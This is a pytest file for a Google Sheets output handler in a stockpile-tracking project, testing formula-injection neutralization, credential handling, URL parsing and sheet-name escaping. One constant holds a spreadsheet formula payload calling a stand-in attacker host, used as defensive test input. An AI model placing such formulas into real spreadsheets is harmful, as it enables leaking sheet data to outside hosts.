"""Tests for the untrusted-data handling of handlers.sheets."""

from unittest.mock import MagicMock, patch

import pytest

from foxhole_stockpiles.connectors.credentials_unavailable_error import (
    CredentialsUnavailableError,
)
from foxhole_stockpiles.core.settings.sections import SheetsHandlerSettings
from foxhole_stockpiles.core.settings.sections.output.sheets_handler import (
    SPREADSHEET_URL_PATTERN,
)
from foxhole_stockpiles.handlers import sheets as sheets_mod
from foxhole_stockpiles.handlers.sheets import SheetsOutputHandler
from foxhole_stockpiles.models.stockpile import Stockpile
from foxhole_stockpiles.models.stockpile_item import StockpileItem

_FORMULA = '=IMPORTXML("https://attacker.example/","//a")'
_URL = "https://docs.google.com/spreadsheets/d/ABC-123/edit?gid=0#gid=0"
_ITEM = StockpileItem(code="Rifle", quantity=1)


def _settings(**overrides: object) -> SheetsHandlerSettings:
    """Build a complete, valid sheets configuration.

    Args:
        **overrides (object): Fields to replace.

    Returns:
        SheetsHandlerSettings: The settings.
    """
    values: dict[str, object] = {
        "creds_path": "client.json",
        "spreadsheet_url": _URL,
        "sheet_id": "Sheet1",
        "start_cell": "A1",
        "row_format": "item_code_name",
    }
    return SheetsHandlerSettings(**{**values, **overrides})


@pytest.mark.parametrize(
    "column", ["region", "structure_type", "stockpile_name", "item_code_name", "item_display_name"]
)
def test_no_text_column_can_carry_a_live_formula(column: str) -> None:
    """Every text cell is neutralized, whatever the source of the stockpile."""
    stockpile = Stockpile(
        name=_FORMULA,
        type=_FORMULA,
        hex=_FORMULA,
        is_reserve=True,
        items=[StockpileItem(code=_FORMULA, quantity=1)],
    )
    handler = SheetsOutputHandler(_settings(row_format=column))

    rows = handler.stockpiles_to_rows([stockpile])

    assert rows == [["'" + _FORMULA]]


def test_unknown_column_is_skipped() -> None:
    """A column name the handler does not know adds no cell."""
    handler = SheetsOutputHandler(_settings(row_format="item_quantity,bogus,item_code_name"))

    assert handler.stockpiles_to_rows([Stockpile(items=[_ITEM])]) == [[1, "Rifle"]]


@pytest.mark.asyncio
async def test_mock_is_not_a_way_around_authentication() -> None:
    """The creds path 'mock' gets no special treatment in production code."""
    handler = SheetsOutputHandler(_settings(creds_path="mock"))
    with (
        patch.object(
            sheets_mod.GoogleCredentialsProvider,
            "load",
            side_effect=CredentialsUnavailableError("Credentials missing"),
        ) as load,
        patch.object(sheets_mod, "build") as build,
    ):
        result = await handler.handle([Stockpile(items=[_ITEM])])

    load.assert_called_once()
    build.assert_not_called()
    assert result == {"message": "Credentials missing"}


@pytest.mark.asyncio
async def test_invalid_configuration_does_not_ask_for_authorization() -> None:
    """A broken configuration is reported before any browser window opens."""
    handler = SheetsOutputHandler(_settings(sheet_id=""))
    with patch.object(sheets_mod.GoogleCredentialsProvider, "load") as load:
        result = await handler.handle([Stockpile(items=[_ITEM])])

    load.assert_not_called()
    assert result == {"message": "Sheet ID missing"}


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "url",
    [
        "https://docs.google.com/spreadsheets/d/ABC-123/edit?gid=0#gid=0",
        "https://docs.google.com/spreadsheets/d/ABC-123",
        "https://docs.google.com/spreadsheets/d/ABC-123/edit/extra/",
    ],
)
async def test_spreadsheet_id_is_only_the_id_segment(url: str) -> None:
    """The ID ends at the next separator, however long the URL is."""
    service = MagicMock()
    handler = SheetsOutputHandler(_settings(spreadsheet_url=url))
    with (
        patch.object(sheets_mod.GoogleCredentialsProvider, "load", return_value=MagicMock()),
        patch.object(sheets_mod, "build", return_value=service),
    ):
        result = await handler.handle([Stockpile(items=[_ITEM])])

    assert result == {"status": "ok"}
    append = service.spreadsheets.return_value.values.return_value.append
    assert append.call_args.kwargs["spreadsheetId"] == "ABC-123"


@pytest.mark.asyncio
async def test_apostrophe_in_sheet_name_is_escaped() -> None:
    """A1 notation doubles an apostrophe inside a quoted sheet name."""
    service = MagicMock()
    handler = SheetsOutputHandler(_settings(sheet_id="Bob's"))
    with (
        patch.object(sheets_mod.GoogleCredentialsProvider, "load", return_value=MagicMock()),
        patch.object(sheets_mod, "build", return_value=service),
    ):
        await handler.handle([Stockpile(items=[_ITEM])])

    append = service.spreadsheets.return_value.values.return_value.append
    assert append.call_args.kwargs["range"] == "'Bob''s'!A1"


@pytest.mark.parametrize(
    ("url", "spreadsheet_id"),
    [
        ("https://docs.google.com/spreadsheets/d/ABC-123", "ABC-123"),
        ("https://docs.google.com/spreadsheets/d/ABC-123/", "ABC-123"),
        ("https://docs.google.com/spreadsheets/d/ABC-123/edit?gid=0#gid=0", "ABC-123"),
        ("https://docs.google.com/spreadsheets/d/ABC-123?usp=sharing", "ABC-123"),
    ],
)
def test_spreadsheet_id_comes_from_any_link_form(url: str, spreadsheet_id: str) -> None:
    """The ID is the path segment after /d/, whatever follows it.

    Args:
        url (str): The link.
        spreadsheet_id (str): The expected ID.
    """
    match = SPREADSHEET_URL_PATTERN.search(url)

    assert match is not None
    assert match.group(1) == spreadsheet_id


@pytest.mark.parametrize(
    "url",
    [
        "https://docs.google.com.example.org/spreadsheets/d/ABC/",
        "http://docs.google.com/spreadsheets/d/ABC/",
        "https://example.org/?u=https://docs.google.com/spreadsheets/d/ABC/",
    ],
)
def test_other_links_are_not_spreadsheets(url: str) -> None:
    """Links outside the Google Sheets address are refused.

    Args:
        url (str): The link.
    """
    assert SPREADSHEET_URL_PATTERN.search(url) is None
